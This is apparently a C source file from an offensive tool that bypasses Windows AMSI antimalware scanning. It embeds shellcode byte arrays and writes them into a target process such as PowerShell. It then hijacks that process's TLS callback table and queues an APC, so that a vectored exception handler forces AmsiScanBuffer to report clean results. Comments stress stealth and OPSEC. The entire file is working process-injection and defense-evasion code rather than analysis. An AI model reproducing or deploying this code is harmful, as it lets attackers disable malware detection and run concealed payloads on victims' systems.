#include "AMSIBypass.h"

// These are generated via xxd from the .bin files
UCHAR veh_bin[] = {
  0x4c, 0x8b, 0x41, 0x08, 0x4c, 0x8b, 0x09, 0x41, 0x8b, 0x01, 0x3d, 0x03,
  0x00, 0x00, 0x80, 0x74, 0x0a, 0x3d, 0x04, 0x00, 0x00, 0x80, 0x74, 0x27,
  0x31, 0xc0, 0xc3, 0x4c, 0x8d, 0x15, 0x5e, 0x00, 0x00, 0x00, 0x4d, 0x8b,
  0x12, 0x4d, 0x89, 0x50, 0x48, 0x49, 0xc7, 0x40, 0x60, 0x01, 0x00, 0x00,
  0x00, 0x49, 0x83, 0x80, 0xf8, 0x00, 0x00, 0x00, 0x01, 0xb8, 0xff, 0xff,
  0xff, 0xff, 0xc3, 0x4d, 0x8b, 0x98, 0xf8, 0x00, 0x00, 0x00, 0x4c, 0x8d,
  0x15, 0x33, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x12, 0x4d, 0x39, 0xd3, 0x75,
  0x27, 0x41, 0xc7, 0x40, 0x78, 0x57, 0x00, 0x07, 0x80, 0x4d, 0x8b, 0x98,
  0x98, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x13, 0x4d, 0x89, 0x90, 0xf8, 0x00,
  0x00, 0x00, 0x49, 0x83, 0x80, 0x98, 0x00, 0x00, 0x00, 0x08, 0xb8, 0xff,
  0xff, 0xff, 0xff, 0xc3, 0x31, 0xc0, 0xc3, 0x90, 0xaa, 0xaa, 0xaa, 0xaa,
  0xaa, 0xaa, 0xaa, 0xaa
};
UINT veh_bin_len = 136;

UCHAR apc_bin[] = {
  0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x01, 0x00, 0x00,
  0x00, 0x48, 0xba, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48,
  0xb8, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xff, 0xd0, 0xcc,
  0x48, 0x83, 0xc4, 0x28, 0x5d, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c, 0x00
};
UINT apc_bin_len = 57;

UCHAR TLSCallback_bin[] = {
  0x83, 0xfa, 0x02, 0x75, 0x01, 0xcc, 0xc3
};
UINT TLSCallback_bin_len = 7;

BOOL ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
    printf("[*] Applying TLS Hijacking AMSI Bypass via VEH handler...\n");
    // The idea is to patch the first TLS callback of the process to point to our APC stub, which in turn will register our VEH handler and call it directly
    // This technique is really stealthy as it doesn't require any APC queuing or thread context manipulation, but it requires the target process to have a TLS directory with at least one callback (which is the case for powershell for example)

    PVOID pRemoteTLSCallback = WrapperVirtualAllocEx(hProcess, NULL, TLSCallback_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteTLSCallback) return FALSE;
    WrapperWriteProcessMemory(hProcess, pRemoteTLSCallback, TLSCallback_bin, TLSCallback_bin_len, NULL);
    WrapperVirtualProtectEx(hProcess, pRemoteTLSCallback, TLSCallback_bin_len, PAGE_EXECUTE_READ, NULL);

    //We Get the remote TLS directory
    IMAGE_DOS_HEADER dosHdr = {0};
    if (!WrapperReadProcessMemory(hProcess, ImageBase, &dosHdr, sizeof(IMAGE_DOS_HEADER), NULL)) return FALSE;

    PVOID pRemoteNtHdr = (PBYTE)ImageBase + dosHdr.e_lfanew;
    IMAGE_NT_HEADERS64 ntHdr = {0};
    if (!WrapperReadProcessMemory(hProcess, pRemoteNtHdr, &ntHdr, sizeof(IMAGE_NT_HEADERS64), NULL)) return FALSE;

    DWORD tlsRva = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tlsRva == 0) {
        printf("[-] Target process has no TLS directory. TLS Hijacking aborted.\n");
        return FALSE; // Si pas de TLS, il faut utiliser Early Bird APC
    }

    PVOID pRemoteTlsDir = (PBYTE)ImageBase + tlsRva;
    IMAGE_TLS_DIRECTORY64 tlsDir = {0};
    if (!WrapperReadProcessMemory(hProcess, pRemoteTlsDir, &tlsDir, sizeof(IMAGE_TLS_DIRECTORY64), NULL)) return FALSE;
    
    PVOID pRemoteCallbacksArray = (PVOID)tlsDir.AddressOfCallBacks; // Is VA not RVA
    INT callbackCount = 0;
    PVOID tempPtr = NULL;
    
    while (TRUE) {
        // Read the table until we find a NULL entry
        if (!WrapperReadProcessMemory(
                hProcess, 
                (PBYTE)pRemoteCallbacksArray + (callbackCount * sizeof(PVOID)), 
                &tempPtr, 
                sizeof(PVOID), 
                NULL)) 
        {
            return FALSE; // Erreur de lecture
        }
        
        if (tempPtr == NULL) break;
        callbackCount++;
    }

    printf("[*] Found %d existing TLS callback(s).\n", callbackCount);

    SIZE_T newArraySize = (callbackCount + 2) * sizeof(PVOID); // +1 for our callback, +1 for the new NULL terminator
    PVOID* localNewArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newArraySize);
    //Copy existing Callback Arrays
    if (callbackCount > 0) {
        WrapperReadProcessMemory(hProcess, pRemoteCallbacksArray, localNewArray, callbackCount * sizeof(PVOID), NULL);
    }
    //Add our callback at the end of the array
    localNewArray[callbackCount] = pRemoteTLSCallback; // Our callback
    localNewArray[callbackCount + 1] = NULL; // New NULL terminator

    PVOID pRemoteNewArray = WrapperVirtualAllocEx(hProcess, NULL, newArraySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteNewArray) {
        HeapFree(GetProcessHeap(), 0, localNewArray);
        return FALSE;
    }
    WrapperWriteProcessMemory(hProcess, pRemoteNewArray, localNewArray, newArraySize, NULL);
    HeapFree(GetProcessHeap(), 0, localNewArray);

    DWORD oldProtectArray;
    WrapperVirtualProtectEx(hProcess, pRemoteNewArray, newArraySize, PAGE_READONLY, &oldProtectArray);

    PVOID pRemoteAddressOfCallBacksField = (PBYTE)pRemoteTlsDir + offsetof(IMAGE_TLS_DIRECTORY64, AddressOfCallBacks);

    DWORD oldProtectHeader;
    if (!WrapperVirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), PAGE_READWRITE, &oldProtectHeader)) {
        printf("[-] Failed to unprotect PE header.\n");
        return FALSE;
    }

    WrapperWriteProcessMemory(hProcess, pRemoteAddressOfCallBacksField, &pRemoteNewArray, sizeof(PVOID), NULL);

    VirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), oldProtectHeader, &oldProtectHeader);

    printf("[+] TLS Hijacking successful! Shellcode will execute on ResumeThread.\n");

}

// Helper function to scan the shellcode array and patch 8-byte placeholders
BOOL PatchPlaceholder(UCHAR* payload, SIZE_T payloadSize, ULONG64 placeholder, PVOID value) {
    for (SIZE_T i = 0; i <= payloadSize - sizeof(ULONG64); i++) {
        if (*(ULONG64*)(&payload[i]) == placeholder) {
            *(PVOID*)(&payload[i]) = value;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
    // 1. Resolve addresses locally. Due to ASLR design on Windows, system DLLs 
    // are mapped at the same base address across all processes in the same session.
    HMODULE hKernel32 = CustomGetModuleHandleW(L"kernel32.dll");
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    
    HMODULE hAmsi = LoadLibraryA("amsi.dll"); 

    PVOID pLoadLibraryA = (PVOID)CustomGetProcAddress(hKernel32, "LoadLibraryA");
    PVOID pRtlAddVeh = (PVOID)CustomGetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
    PVOID pAmsiScanBuffer = (PVOID)CustomGetProcAddress(hAmsi, "AmsiScanBuffer");

    if (!pLoadLibraryA || !pRtlAddVeh || !pAmsiScanBuffer) {
        printf("[-] Failed to resolve local API addresses.\n");
        return FALSE;
    }

    // 2. Patch VEH Stub Placeholder
    if (!PatchPlaceholder(veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
        printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
        return FALSE;
    }

    // 3. Allocate and write VEH Stub (RW -> RX for OPSEC)
    PVOID pRemoteVeh = WrapperVirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteVeh) return FALSE;
    WrapperWriteProcessMemory(hProcess, pRemoteVeh, veh_bin, veh_bin_len, NULL);
    
    DWORD oldProtect;
    WrapperVirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);

    // 4. Patch APC Stub Placeholders
    PatchPlaceholder(apc_bin, apc_bin_len, 0xBBBBBBBBBBBBBBBB, pLoadLibraryA);
    PatchPlaceholder(apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, pRemoteVeh);
    PatchPlaceholder(apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRtlAddVeh);

    // 5. Allocate and write APC Stub
    PVOID pRemoteApc = WrapperVirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteApc) return FALSE;
    WrapperWriteProcessMemory(hProcess, pRemoteApc, apc_bin, apc_bin_len, NULL);
    WrapperVirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect);

    
    printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
    printf("[+] APC Stub setup at: 0x%p\n", pRemoteApc);
    printf("[+] Using TLS Callbacks to trigger VEH on thread creation.\n");
    // Upon Thread Creation ntdll!LdrpCallTlsInitializers execute the TLS callback in the newly created thread
    // So out strategy is to inject a int3 on the new thread contexte to re-execute our VEH handler onto the new thread
    printf("[+] Using TLS Callbacks to trigger VEH on thread creation.\n");

    ApplyTLSHijacking(hProcess, hThread, ImageBase);

    // 6. Queue the APC to the target thread
    // it will fire on resume.
    if (!WrapperQueueUserAPC((PAPCFUNC)pRemoteApc, hThread, 0)) {
        printf("[-] Failed to queue APC.\n");
        return FALSE;
    }

    printf("[+] APC queued successfully.\n");
    return TRUE;
}